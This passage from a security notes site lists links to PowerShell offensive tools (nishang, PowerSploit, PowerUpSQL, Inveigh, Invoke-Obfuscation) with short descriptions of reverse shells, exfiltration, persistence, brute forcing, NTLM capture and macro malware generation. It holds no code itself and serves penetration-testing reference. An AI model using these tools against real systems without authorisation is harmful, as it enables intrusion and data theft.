<li><a href="https://github.com/samratashok/nishang/blob/master/Pivot/Run-EXEonRemote.ps1">Run-EXEonRemote</a> Copy and execute an executable on multiple machines.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Pivot/Invoke-NetworkRelay.ps1">Invoke-NetworkRelay</a> Create network relays between computers.</li>
</ul>
</li>
<li>Prasadhak<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Prasadhak/Prasadhak.ps1">Prasadhak</a>Check running hashes of running process against the VirusTotal database.</li>
</ul>
</li>
<li>Scan<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Scan/Brute-Force.ps1">Brute-Force</a>Brute force FTP, Active Directory, MSSQL, and Sharepoint.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Scan/Port-Scan.ps1">Port-Scan</a>A handy port scanner.</li>
<li>Powerpreter</li>
<li><a href="https://github.com/samratashok/nishang/tree/master/powerpreter">Powerpreter</a>All the functionality of nishang in a single script module.</li>
</ul>
</li>
<li>Shells<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PsGcat.ps1">Invoke-PsGcat</a>Send commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PsGcatAgent.ps1">Invoke-PsGcatAgent</a>Execute commands and scripts sent by Invoke-PsGcat.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Invoke-PowerShellTcp</a>An interactive PowerShell reverse connect or bind shell</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">Invoke-PowerShellTcpOneLine</a>Stripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLineBind.ps1">Invoke-PowerShellTcpOneLineBind</a>Bind version of Invoke-PowerShellTcpOneLine.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1">Invoke-PowerShellUdp</a>An interactive PowerShell reverse connect or bind shell over UDP</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdpOneLine.ps1">Invoke-PowerShellUdpOneLine</a>Stripped down version of Invoke-PowerShellUdp.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PoshRatHttps.ps1">Invoke-PoshRatHttps</a>Reverse interactive PowerShell over HTTPS.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PoshRatHttp.ps1">Invoke-PoshRatHttp</a>Reverse interactive PowerShell over HTTP.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Remove-PoshRat.ps1">Remove-PoshRat</a>Clean the system after using Invoke-PoshRatHttps</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellWmi.ps1">Invoke-PowerShellWmi</a>Interactive PowerShell using WMI.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1">Invoke-PowerShellIcmp</a>An interactive PowerShell reverse shell over ICMP.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-JSRatRundll.ps1">Invoke-JSRatRundll</a>An interactive PowerShell reverse shell over HTTP using rundll32.exe.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-JSRatRegsvr.ps1">Invoke-JSRatRegsvr</a>An interactive PowerShell reverse shell over HTTP using regsvr32.exe.</li>
</ul>
</li>
<li>Utility<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Add-Exfiltration.ps1">Add-Exfiltration</a>Add data exfiltration capability to Gmail, Pastebin, a web server, and DNS to any script.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Add-Persistence.ps1">Add-Persistence</a>Add reboot persistence capability to a script.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Remove-Persistence.ps1">Remove-Persistence</a>Remote persistence added by the Add-Persistence script.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Do-Exfiltration.ps1">Do-Exfiltration</a>Pipe (|) this to any script to exfiltrate the output.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Download.ps1">Download</a>Transfer a file to the target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Parse_Keys.ps1">Parse_Keys</a>Parse keys logged by the keylogger.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Decode.ps1">Invoke-Encode</a>Encode and compress a script or string.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Decode.ps1">Invoke-Decode</a>Decode and decompress a script or string from Invoke-Encode.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Start-CaptureServer.ps1">Start-CaptureServer</a>Run a web server which logs Basic authentication and SMB hashes.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/ConvertTo-ROT13.ps1">ConvertTo-ROT13</a>Encode a string to ROT13 or decode a ROT13 string.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Out-DnsTxt.ps1">Out-DnsTxt</a>Generate DNS TXT records which could be used with other scripts.</li>
</ul>
</li>
</ul>
</li>
<li>External Services <ul>
<li>Shodan: <a href="https://github.com/darkoperator/Posh-Shodan">https://github.com/darkoperator/Posh-Shodan</a></li>
</ul>
</li>
<li>Scaning<ul>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1</a></li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1">https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1</a></li>
<li>Parse Nmap Reports: <a href="https://github.com/SamuelArnold/StarKill3r/blob/master/Star%20Killer/Star%20Killer/bin/Debug/Scripts/SANS-SEC505-master/scripts/Day1-PowerShell/Parse-Nmap.ps1">https://github.com/SamuelArnold/StarKill3r/blob/master/Star%20Killer/Star%20Killer/bin/Debug/Scripts/SANS-SEC505-master/scripts/Day1-PowerShell/Parse-Nmap.ps1</a></li>
<li>Paser Nessus Reports: <a href="https://github.com/darkoperator/Posh-NVS">https://github.com/darkoperator/Posh-NVS</a></li>
<li>Scandiff is a PowerShell script to automate host discovery and scanning with nmap: <a href="https://github.com/hardwaterhacker/scandiff">https://github.com/hardwaterhacker/scandiff</a></li>
</ul>
</li>
<li>Brute Forcing<ul>
<li>Active Directory brute forcing: <a href="https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1">https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1</a></li>
<li>Get-WinRMPassword - <a href="https://poshsecurity.com/blog/2014/3/20/powershell-winrm-get-winrmpassword.html">https://poshsecurity.com/blog/2014/3/20/powershell-winrm-get-winrmpassword.html</a></li>
<li>Get-WimPassword</li>
</ul>
</li>
<li>Database Attacks<ul>
<li>PowerUpSQL - Toolkit for Attacking SQL Server: <a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a></li>
<li>Execute command over MSSQL: Nishang/Execute-Command-MSSQL.ps1</li>
</ul>
</li>
<li>Capture NTLM<ul>
<li><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></li>
</ul>
</li>
<li>Obfuscation<ul>
<li><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></li>
<li><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a></li>
</ul>
</li>
<li>Fileless Malware<ul>
<li>Invoke-NoShell outputs a Microsoft Office Word .doc file with an embedded macro: <a href="https://github.com/G4lB1t/Invoke-NoShell">https://github.com/G4lB1t/Invoke-NoShell</a></li>
</ul>
</li>
</ul>
<h2 id="resources">Resources<a class="headerlink" href="#resources" title="Permanent link">&para;</a></h2>
<h3 id="new-references">New References<a class="headerlink" href="#new-references" title="Permanent link">&para;</a></h3>
<ul>
<li>PowerShell Basics for Security Professionals Part 1: <a href="https://www.youtube.com/watch?v=B0EsL1j_-qw">https://www.youtube.com/watch?v=B0EsL1j_-qw</a></li>
<li>Constrained Mode: <a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/">https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/</a></li>
<li><a href="https://github.com/subTee/CVE-2014-4113/blob/master/Invoke-SystemShell.ps1">https://github.com/subTee/CVE-2014-4113/blob/master/Invoke-SystemShell.ps1</a></li>
<li><a href="http://www.labofapenetrationtester.com/2014/12/using-nishang-with-cobalt-strike.html">http://www.labofapenetrationtester.com/2014/12/using-nishang-with-cobalt-strike.html</a></li>
<li><a href="http://blog.cobaltstrike.com/2014/09/23/cobalt-strike-2-1-i-have-the-powershell/">http://blog.cobaltstrike.com/2014/09/23/cobalt-strike-2-1-i-have-the-powershell/</a></li>
</ul>
<h3 id="development-environment">Development Environment<a class="headerlink" href="#development-environment" title="Permanent link">&para;</a></h3>
<ul>
<li>How To Make Visual Studio Code Look And Behave Like The PowerShell ISE: <a href="https://blog.techsnips.io/how-to-make-visual-studio-code-look-and-behave-like-the-powershell-ise/">https://blog.techsnips.io/how-to-make-visual-studio-code-look-and-behave-like-the-powershell-ise/</a></li>
</ul>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../active-directory/" title="Active Directory" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Active Directory
              </span>
            </div>
          </a>
        
        
          <a href="../windows-issues/" title="Windows issues" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Windows issues
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
      
    
  </body>
</html>